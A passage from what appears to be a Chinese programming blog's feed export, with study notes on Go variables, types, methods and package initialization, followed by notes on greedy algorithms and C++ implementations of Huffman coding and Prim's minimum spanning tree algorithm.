class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于在包一级声明的变量来说，它们的生命周期和整个程序的运行周期是一致的。而相比之下，局部变量的生命周期则是<strong>动态</strong>的：每次从创建一个新变量的声明语句开始，直到该变量不再被引用为止，然后变量的存储空间可能被回收。函数的参数变量和返回值变量都是局部变量。它们在函数每次被调用的时候创建。</p><blockquote><p>Go语言的自动垃圾收集器是如何知道一个变量是何时可以被回收的呢？这里我们可以避开完整的技术细节，基本的实现思路是，从每个包级的变量和每个当前运行函数的每一个局部变量开始，通过指针或引用的访问路径遍历，是否可以找到该变量。如果不存在这样的访问路径，那么说明该变量是不可达的，也就是说它是否存在并不会影响程序后续的计算结果。</p></blockquote><p>因为一个变量的有效周期只取决于是否可达，因此一个循环迭代内部的局部变量的生命周期可能超出其局部作用域。同时，局部变量可能在函数返回之后依然存在。</p><p>编译器会自动选择在栈上还是在堆上分配局部变量的存储空间，但可能令人惊讶的是，这个选择并不是由用var还是new声明变量的方式决定的。也就是说，你并不需为了编写正确的代码而要考虑变量的逃逸行为，要记住的是，逃逸的变量需要额外分配内存，同时对性能的优化可能会产生细微的影响</p><h3 id="new函数"><a class="markdownIt-Anchor" href="#new函数"></a> new函数</h3><p>另一个创建变量的方法是调用内建的new函数。表达式new(T)将创建一个T类型的匿名变量，初始化为T类型的零值，然后返回变量地址，返回的指针类型为 *T 。</p><p>用new函数创建变量和普通变量声明没有区别，这是一个<strong>语法糖</strong>。</p><blockquote><p>语法糖（Syntactic Sugar）是一种编程术语，它指的是在编程语言中添加的某种语法，这种语法对语言的功能并没有影响，但是可以使代码更易读或更易写。换句话说，语法糖让代码更加“甜”，更加愉快和方便地去编写和理解。</p></blockquote><h3 id="类型"><a class="markdownIt-Anchor" href="#类型"></a> 类型</h3><p>在Go语言中，可以用<code>type</code>关键字定义新的类型。一个类型声明语句创建了一个新的类型名称，和现有类型具有相同的底层结构。新命名的类型提供了一个方法，用来分隔不同概念的类型，这样即使它们底层类型相同也是不兼容的。</p><p>类型声明语句一般出现在包一级，因此如果新创建的类型名字的首字符大写，则在包外部也可以使用。</p><p>Go语言中的<code>type</code>关键字和C语言中的<code>typedef</code>关键字有一些相似之处，都可以用来定义新的类型。但是，Go语言的<code>type</code>关键字功能更强大，因为它不仅可以定义基础类型的别名，还可以定义结构体、接口等复杂类型。</p><p>在C语言中，<code>typedef</code>关键字常常用来为复杂的数据类型定义别名，使代码更简洁、更易读。例如，你可以使用<code>typedef</code>定义一个结构体类型的别名：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125; Person;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Person</code>是一个新的类型，它是一个结构体类型，包含了<code>name</code>和<code>age</code>两个字段。</p><p>然而，C语言的<code>typedef</code>只能定义别名，不能创建新的类型。在上面的例子中，<code>Person</code>实际上和匿名的<code>struct &#123;char* name; int age;&#125;</code>是同一种类型。但在Go语言中，使用<code>type</code>关键字定义的新类型是真正的新类型，而不仅仅是别名。例如：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MyInt <span class="type">int</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>MyInt</code>是一个新的类型，它的底层类型是<code>int</code>。虽然你可以像使用<code>int</code>一样使用<code>MyInt</code>，但是它们是不同的类型，不能直接互相赋值。</p><p>所以，尽管Go的<code>type</code>关键字和C的<code>typedef</code>关键字在某些方面有相似之处，但Go的<code>type</code>关键字更强大，可以创建真正的新类型。</p><h4 id="转型操作"><a class="markdownIt-Anchor" href="#转型操作"></a> 转型操作</h4><p>对于每一个类型T，都有一个对应的类型转换操作T(x)，用于将x转为T类型（译注：如果T是指针类型，可能会需要用小括弧包装T，比如 (*int)(0) ）。只有当两个类型的底层基础类型相同时，才允许这种转型操作，或者是两者都是指向相同底层结构的指针类型，这些转换只改变类型而不会影响值本身。如果x是可以赋值给T类型的值，那么x必然也可以被转为T类型，但是一般没有这个必要。</p><h4 id="自定义方法集"><a class="markdownIt-Anchor" href="#自定义方法集"></a> 自定义方法集</h4><p>在 Go 语言中，我们可以为自定义类型（包括基本类型的别名、结构体类型等）定义方法，这样这个类型就有了一组相关的行为，这一点在很多面向对象的语言中，例如 Java 或 C++，是通过类来实现的。然而，Go 并没有类的概念，它通过在类型上定义方法来实现面向对象编程的一些特性。</p><p>在 Go 语言中，一个类型的方法集就是所有附加在该类型上的方法。例如，如果我们有一个自定义类型 <code>MyInt</code>：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MyInt <span class="type">int</span></span><br></pre></td></tr></table></figure><p>我们可以为 <code>MyInt</code> 定义一个方法 <code>Add</code>：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m MyInt)</span></span> Add(other MyInt) MyInt &#123;</span><br><span class="line">    <span class="keyword">return</span> m + other</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Add</code> 是 <code>MyInt</code> 类型的一个方法，它接受一个 <code>MyInt</code> 类型的参数，返回两个 <code>MyInt</code> 类型的值的和。现在，<code>MyInt</code> 类型的方法集包含了 <code>Add</code> 方法。</p><p>这样，我们就可以像这样使用 <code>MyInt</code>：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a MyInt = <span class="number">10</span></span><br><span class="line"><span class="keyword">var</span> b MyInt = <span class="number">20</span></span><br><span class="line">c := a.Add(b)  <span class="comment">// c is 30</span></span><br></pre></td></tr></table></figure><p>这里的 <code>Add</code> 就是 <code>MyInt</code> 类型的一个方法，它定义了 <code>MyInt</code> 类型的一种行为。</p><p>这种方式使得 Go 语言可以实现一些面向对象编程的特性，如封装、多态等，而无需引入类的概念。</p><p>（<s>简直是typedef和class的结合体</s>）</p><h3 id="包和文件"><a class="markdownIt-Anchor" href="#包和文件"></a> 包和文件</h3><p>Go语言中的包和其他语言的库或模块的概念类似，目的都是为了支持模块化、封装、单独编译和代码重用。</p><blockquote><p>一个包的源代码保存在一个或多个以.go为文件后缀名的源文件中，通常一个包所在目录路径的后缀是包的导入路径；<a href="http://xn--gopl-zu6f77pg6m.io/ch1/helloworld%E5%AF%B9%E5%BA%94%E7%9A%84%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%98%AF$GOPATH/src/gopl.io/ch1/helloworld%E3%80%82">例如包gopl.io/ch1/helloworld对应的目录路径是$GOPATH/src/gopl.io/ch1/helloworld。</a></p></blockquote><p>每个包都对应一个独立的名字空间。例如，在image包中的Decode函数和在unicode/utf16包中的Decode函数是不同的。要在外部引用该函数，必须显式使用image.Decode或utf16.Decode形式访问。</p><p>包还可以让我们通过控制哪些名字是外部可见的来隐藏内部实现信息。在Go语言中，一个简单的规则是：如果一个名字是大写字母开头的，那么该名字是导出的。</p><p>在每个源文件的包声明前紧跟着的注释是包注释（§10.7.4）。通常，包注释的第一句应该先是包的功能概要说明。一个包通常只有一个源文件有包注释（译注：如果有多个包注释，目前的文档工具会根据源文件名的先后顺序将它们链接为一个包注释）。如果包注释很大，通常会放到一个独立的doc.go文件中。</p><h4 id="包的初始化"><a class="markdownIt-Anchor" href="#包的初始化"></a> 包的初始化</h4><p>包的初始化首先是解决包级变量的依赖顺序，然后按照包级变量声明出现的顺序依次初始化：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = b + c <span class="comment">// a 第三个初始化, 为 3</span></span><br><span class="line"><span class="keyword">var</span> b = f() <span class="comment">// b 第二个初始化, 为 2, 通过调用 f (依赖c)</span></span><br><span class="line"><span class="keyword">var</span> c = <span class="number">1</span> <span class="comment">// c 第一个初始化, 为 1</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> <span class="type">int</span> &#123; <span class="keyword">return</span> c + <span class="number">1</span> &#125;</span><br></pre></td></tr></table></figure><p>如果包中含有多个.go源文件，它们将按照发给编译器的顺序进行初始化，Go语言的构建工具首先会将.go文件根据文件名排序，然后依次调用编译器编译。</p><blockquote><p>Go语言使用一个叫做&quot;初始化队列&quot;的机制来管理这个过程。在编译时，Go语言会创建一个初始化队列，其中包含了所有的全局变量和它们的依赖关系。然后，在运行时，Go语言会按照这个队列的顺序来初始化全局变量。如果一个变量的依赖还没有被初始化，那么Go语言会先初始化那个依赖。</p><p>这是一个非常强大的特性，因为它使得开发者可以在全局变量的初始化代码中使用复杂的逻辑，而不需要担心初始化的顺序。</p></blockquote><p>对于在包级别声明的变量，如果有初始化表达式则用表达式初始化，还有一些没有初始化表达式的，例如某些表格数据初始化并不是一个简单的赋值过程。在这种情况下，我们可以用一个特殊的init初始化函数来简化初始化工作。每个文件都可以包含多个init初始化函数</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p>这样的init初始化函数除了不能被调用或引用外，其他行为和普通函数类似。在每个文件中的init初始化函数，在程序开始执行时按照它们声明的顺序被自动调用。（有点像php中的__construct()魔术方法？）</p><p>每个包在解决依赖的前提下，以导入声明的顺序初始化，每个包只会被初始化一次。因此，如果一个p包导入了q包，那么在p包初始化的时候可以认为q包必然已经初始化过了。初始化工作是自下而上进行的，main包最后被初始化。以这种方式，可以确保在main函数执行之前，所有依赖的包都已经完成初始化工作了。</p><blockquote><p>在 C 语言中，<code>#include</code> 指令会直接将被包含的文件内容复制到当前位置，如果一个头文件被多次包含，那么它的内容就会被多次复制，可能会导致重复定义的问题。为了避免这个问题，C 语言的头文件通常会使用预处理宏来防止重复包含：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEADER_FILE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEADER_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... header file content ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// HEADER_FILE</span></span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>HEADER_FILE</code> 是一个预处理宏，如果它没有被定义，那么头文件的内容就会被包含，否则就会被忽略。这样就可以避免重复包含的问题。</p><p>Python 语言的模块导入机制也设计得很好，每个模块在每个程序中只会被导入一次。如果一个模块被多次导入，那么在第一次导入后，Python 就会把它缓存起来，后续的导入操作只会返回缓存的模块，而不会再次执行模块的代码。这样也避免了重复导入的问题。</p><p>Go 语言的包导入机制也是类似的，每个包只会被初始化一次，而且这个初始化过程是在程序启动时自动完成的，不需要程序员手动进行。这种设计确实避免了 C 语言中可能出现的重复包含（include）的问题，也避免了 Python 中可能出现的递归导入的问题。（说如果出现循环依赖，Go还是会和Python一样报错中断运行）</p></blockquote><p>那么第一讲就此完结吧。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/1c3f280e740cecf4e83406e672b3525e.jpeg" alt="1c3f280e740cecf4e83406e672b3525e" /></p>]]></content>
      
      
      <categories>
          
          <category> Go!Go!Go! </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法笔记之贪心算法</title>
      <link href="/posts/f5f6199fa035/"/>
      <url>/posts/f5f6199fa035/</url>
      
        <content type="html"><![CDATA[<h2 id="贪婪策略"><a class="markdownIt-Anchor" href="#贪婪策略"></a> 贪婪策略</h2><p>贪心算法（Greedy Algorithm）是一种在每一步选择中都采取在当前状态下最好或最优（即最有利）的选择，从而希望导致结果是全局最好或最优的算法。贪心算法在有最优子结构的问题中尤为有效。最优子结构的意思是局部最优解能决定全局最优解（对有些问题这是显然的，如最小生成树（Minimum Spanning Tree），对其它问题却是非常不明显的，如单源最短路径（Single-Source Shortest Path））。</p><p>贪心算法与动态规划的不同在于：贪心算法对每个子问题的解决方案都做出选择，不能回退。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，有回退功能。更详细的如下：</p><ol><li><strong>贪心算法是先做出选择再解决产生的子问题，而动态规划则是先解决子问题再做出选择</strong>。</li><li>动态规划每一步可能会产生多个子问题，而贪心算法一般每一步只会产生一个子问题（且为非空）</li><li>从特点上看，动态规划是<strong>自底向上</strong>解决问题，而贪心算法是<strong>自顶向下</strong>解决问题。</li></ol><p>贪心算法可以解决一些最优化问题，如：求图中的最小生成树、求哈夫曼编码等。然而对于工程和生活中的问题，贪心算法一般不能得到我们所要求的答案。因为贪心算法采取的是局部最优策略，这种策略并不保证能得到全局最优解，因为选择的只是局部最优，所以它不像动态规划那样能解决更加复杂的最优化问题。</p><p>贪心算法的基本步骤：</p><ol><li>建立数学模型来描述问题。</li><li>把求解的问题分成若干个子问题。</li><li>对每一子问题求解，得到子问题的局部最优解。</li><li>把子问题的局部最优解合成原来问题的一个解。</li></ol><h2 id="贪心算法的要素"><a class="markdownIt-Anchor" href="#贪心算法的要素"></a> 贪心算法的要素</h2><p>贪心算法适用的前提是：局部最优策略能导致产生全局最优解。<strong>实际上，贪心算法适用的情况很少</strong>。工程中的问题很少能整除成满足这个特性的问题，所以在采用贪心算法前，必须对问题进行深入分析。</p><p>判断一个问题能否用贪心算法解决，即局部最优解能否导致全局最优解，通常需要依赖问题本身的特性以及一些数学证明。这通常涉及到两个主要的概念：<strong>最优子结构和贪心选择性质</strong>。</p><ol><li><p><strong>最优子结构</strong>：一个问题的最优解包含其子问题的最优解。简单来说，问题的最优解可以通过找到其子问题的最优解并选择最优的一种方案来构造。如果一个问题有最优子结构，一旦所有子问题都已解决，我们可以简单地通过在所有子问题中选择每个子问题的最优选择来找到全局最优解。</p></li><li><p><strong>贪心选择性质</strong>：全局最优解可以通过局部最优选择来达到。也就是说，选择当前最优的解，也就是贪心选择，将会导致全局最优解。贪心选择性质是贪心算法可行的主要特性，它意味着我们可以做出一个局部最优选择，并且这个选择不会影响后续的选择，这样我们就可以保证最终的解是全局最优的。</p></li></ol><p>对于许多问题，我们可以通过反证法或者归纳法来证明贪心策略的正确性。具体来说，我们可以假设存在一个不是由贪心策略得出的最优解，然后找出矛盾，或者我们可以证明问题的每一个步骤都可以应用贪心策略。</p><p>然而，值得注意的是，尽管贪心算法在某些问题上很有效，但并不是所有问题都适合使用贪心算法。有些问题可能看起来像是可以应用贪心算法，但在深入分析后可能发现不能得到全局最优解。这就需要我们对问题有深入的理解和分析。</p><h2 id="贪心算法的问题集"><a class="markdownIt-Anchor" href="#贪心算法的问题集"></a> 贪心算法的问题集</h2><h3 id="哈夫曼树编码"><a class="markdownIt-Anchor" href="#哈夫曼树编码"></a> 哈夫曼树编码</h3><p>哈夫曼编码（Huffman Coding）是一种广泛用于数据压缩的算法，特别是在文件压缩和通信编码中。哈夫曼编码是一种前缀编码，即在该编码中，任何字符的编码都不是其他字符编码的前缀，这使得编码的解码非常清晰，不会产生歧义。哈夫曼编码的一个关键特性是它是一种最优编码，即对于给定的字符频率，哈夫曼编码可以生成最短的平均编码长度。</p><p>哈夫曼编码算法的基本步骤如下：</p><ol><li>创建一个节点列表，其中每个节点包含一个字符及其在数据中的频率。</li><li>将节点列表按照频率从低到高排序。</li><li>从列表中取出频率最低的两个节点，然后创建一个新的父节点，其频率是这两个节点频率的和。将这两个节点设置为新节点的左右子节点。</li><li>将新的父节点添加到列表中，并从列表中移除已处理的两个节点。</li><li>重复步骤3和4，直到列表中只剩下一个节点。这个节点就是哈夫曼树的根节点。</li></ol><p>在哈夫曼编码算法中，贪心算法的应用体现在每次都选择频率最低的两个节点来创建新的父节点。这是一个贪心的选择，因为我们总是选择当前能够立即达到的最小频率。这种选择保证了生成的哈夫曼树的平均编码长度最短，即最优。</p><p>需要注意的是，虽然哈夫曼编码能够保证最短的平均编码长度，但它并不一定能够为每个字符生成最短的编码。实际的编码长度取决于字符的频率：频率高的字符会得到更短的编码，而频率低的字符可能会得到更长的编码。这样我们就能根据每个字母出现的频率最大程度的压缩信息。</p><p>在编程中，代码也很容易实现。我们可以定义一个优先队列储存所有的哈夫曼节点，每个节点是带有编码和频率的字符节点。然后我们可以每次从优先队列中弹出两个最小节点，把它们作为一个新的父节点的左、右孩子，并把父节点的频率设置为左右两节点的频率之和，再把父节点添加入优先队列中。这样重复n次（共n个节点）后得到的优先队列就是一个哈夫曼树。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240422114230286.png" alt="image-20240422114230286" /></p><p>伪代码实现如下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">HuffmanCodingAlgorithm</span>(<span class="type">int</span> A[],<span class="type">int</span> n)&#123;</span><br><span class="line">    <span class="comment">//A是储存输入字符串的数组，n是A中的不重复元素个数</span></span><br><span class="line">    初始化一个优先队列PQ，使其包括A的n个元素</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BinaryTreeNode</span>*temp;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">auto</span> temp = <span class="built_in">new</span> (BinaryTreeNode);</span><br><span class="line">        temp-&gt;left = Delete-<span class="built_in">Min</span>(PQ);</span><br><span class="line">        temp-&gt;right = Delete-<span class="built_in">Min</span>(PQ);</span><br><span class="line">        temp-&gt;data = temp-&gt;letf-&gt;data + temp-&gt;right-&gt;data;</span><br><span class="line">        Insert temp to PQ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> PQ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的c++代码实现如下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">HuffmanNode</span> &#123;</span><br><span class="line">    <span class="type">char</span> ch; <span class="comment">// 字符</span></span><br><span class="line">    <span class="type">int</span> freq; <span class="comment">// 频率</span></span><br><span class="line">    shared_ptr&lt;HuffmanNode&gt; left;</span><br><span class="line">    shared_ptr&lt;HuffmanNode&gt; right;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Compare</span> &#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> shared_ptr&lt;HuffmanNode&gt;&amp; a, <span class="type">const</span> shared_ptr&lt;HuffmanNode&gt;&amp; b)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a-&gt;freq &gt; b-&gt;freq;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">priority_queue&lt;shared_ptr&lt;HuffmanNode&gt;, vector&lt;shared_ptr&lt;HuffmanNode&gt;&gt;, Compare&gt; </span><br><span class="line"><span class="built_in">HuffmanCodingAlgorithm</span>(vector&lt;pair&lt;<span class="type">char</span>, <span class="type">int</span>&gt;&gt; A) &#123;</span><br><span class="line">    priority_queue&lt;shared_ptr&lt;HuffmanNode&gt;, vector&lt;shared_ptr&lt;HuffmanNode&gt;&gt;, Compare&gt; PQ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; pair : A) &#123;</span><br><span class="line">        PQ.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;HuffmanNode&gt;(pair.first, pair.second, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (PQ.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">auto</span> left = PQ.<span class="built_in">top</span>(); PQ.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">auto</span> right = PQ.<span class="built_in">top</span>(); PQ.<span class="built_in">pop</span>();</span><br><span class="line">        PQ.<span class="built_in">push</span>(<span class="built_in">make_shared</span>&lt;HuffmanNode&gt;(<span class="string">&#x27;\0&#x27;</span>, left-&gt;freq + right-&gt;freq, left, right));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> PQ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到哈夫曼树后就可以根据哈夫曼树对信息压缩编码或解码了，要得到一个字符的编码，只需要遍历哈夫曼树查找该字符所在的节点，每经过一次左分支就标注0，经过一次右分支就标注1，最后得到的就是该字符的编码。解码操作也很简单，因为每个编码对应的节点唯一，所以只要根据01编码去定向寻找对应的节点，就可以找到对应的字符恢复数据。</p><h3 id="最小生成树问题"><a class="markdownIt-Anchor" href="#最小生成树问题"></a> 最小生成树问题</h3><p>这一部分在之前的数据结构——图论部分有过粗略的解释，但是当时并未附上源代码，现在我来详细的介绍一下求解最小生成树的两种算法：Prim算法和Kruskal算法。</p><h4 id="prim算法"><a class="markdownIt-Anchor" href="#prim算法"></a> Prim算法</h4><p>这部分可以参考<a href="https://adam8en.github.io/2023/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%80%E9%94%A6%EF%BC%88%E5%85%AD%EF%BC%89%E2%80%94%E2%80%94%E8%B5%B0%E8%BF%91%E5%9B%BE%E8%AE%BA/">数据结构什锦（六）—— 走近图论| Adam8en の 8log</a>。</p><p>具体的C++实现代码如下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分别储存所有的node、selected、minDist、parent</span></span><br><span class="line"><span class="comment">//初始化所有的node的selected为false，minDist为无穷大，parent为-1</span></span><br><span class="line"><span class="comment">//然后初始化第一个node的selected为true，minDist为0，parent为-1</span></span><br><span class="line"><span class="comment">//接着依次进行update-&gt;scan-&gt;add</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义图中的顶点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vertex</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> distance; <span class="comment">// 从起始位置到该顶点的最短距离</span></span><br><span class="line">    [[maybe_unused]] <span class="type">bool</span> selected; <span class="comment">// 该顶点是否已经访问过</span></span><br><span class="line">    vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; neighbors; <span class="comment">// 该顶点的邻居（相邻顶点编号和边权重）</span></span><br><span class="line">    <span class="comment">//其中neighbor.first表示单项图中该顶点邻接的顶点的编号，neighbor.second表示边的权重</span></span><br><span class="line">    <span class="type">int</span> parent; <span class="comment">// 该顶点在最短路径树中的父节点</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Vertex</span><span class="params">(<span class="type">int</span> _id)</span> : id(_id), distance(INT_MAX), selected(false) , parent(<span class="number">-1</span>) &#123;</span>&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义图</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;Vertex *&gt; vertices; <span class="comment">// 图中的所有顶点，对应邻接表中储存所有顶点的链表</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Graph</span><span class="params">(<span class="type">int</span> numVertices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建图中的所有顶点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numVertices; ++i) &#123;</span><br><span class="line">            vertices.<span class="built_in">push_back</span>(<span class="keyword">new</span> <span class="built_in">Vertex</span>(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Graph</span>() &#123;<span class="comment">// 析构函数，释放所有顶点的内存</span></span><br><span class="line">        <span class="keyword">for</span> (Vertex* v : vertices) &#123;</span><br><span class="line">            <span class="keyword">delete</span> v;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加有向边</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addDirectedEdge</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> weight)</span> </span>&#123;</span><br><span class="line">        vertices[from]-&gt;neighbors.<span class="built_in">emplace_back</span>(to, weight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加无向边</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> weight)</span> </span>&#123;</span><br><span class="line">        vertices[from]-&gt;neighbors.<span class="built_in">emplace_back</span>(to, weight);</span><br><span class="line">        vertices[to]-&gt;neighbors.<span class="built_in">emplace_back</span>(from, weight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prim算法</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">prim</span><span class="params">(<span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 初始化所有的node的selected为false，minDist为无穷大，parent为-1</span></span><br><span class="line">        <span class="keyword">for</span> (Vertex *v: vertices) &#123;</span><br><span class="line">            v-&gt;selected = <span class="literal">false</span>;</span><br><span class="line">            v-&gt;distance = INT_MAX;</span><br><span class="line">            v-&gt;parent = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 初始化第一个node的selected为true，minDist为0，parent为-1</span></span><br><span class="line">        vertices[start]-&gt;selected = <span class="literal">true</span>;</span><br><span class="line">        vertices[start]-&gt;distance = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 依次进行update-&gt;scan-&gt;add</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vertices.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="built_in">updateDistances</span>(start);</span><br><span class="line">            <span class="type">int</span> next = <span class="built_in">scan</span>();</span><br><span class="line">            start = next;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">add</span>(next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查是否所有顶点都已被选中</span></span><br><span class="line">        <span class="keyword">for</span> (Vertex *v: vertices) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!v-&gt;selected) &#123;</span><br><span class="line">                cout</span><br><span class="line">                        &lt;&lt; <span class="string">&quot;The graph is not connected. Cannot generate Minimum Spanning Tree.&quot;</span></span><br><span class="line">                        &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">updateDistances</span><span class="params">(<span class="type">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;neighbor: vertices[start]-&gt;neighbors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!vertices[neighbor.first]-&gt;selected &amp;&amp;</span><br><span class="line">                neighbor.second &lt; vertices[neighbor.first]-&gt;distance) &#123;</span><br><span class="line">                vertices[neighbor.first]-&gt;distance = neighbor.second;</span><br><span class="line">                vertices[neighbor.first]-&gt;parent = start;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">scan</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> minDist = INT_MAX;</span><br><span class="line">        <span class="type">int</span> minVertex = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (Vertex *v: vertices) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!v-&gt;selected &amp;&amp; v-&gt;distance &lt; minDist) &#123;</span><br><span class="line">                minDist = v-&gt;distance;</span><br><span class="line">                minVertex = v-&gt;id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minVertex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> next)</span> </span>&#123;</span><br><span class="line">        vertices[next]-&gt;selected = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Graph <span class="title">g</span><span class="params">(<span 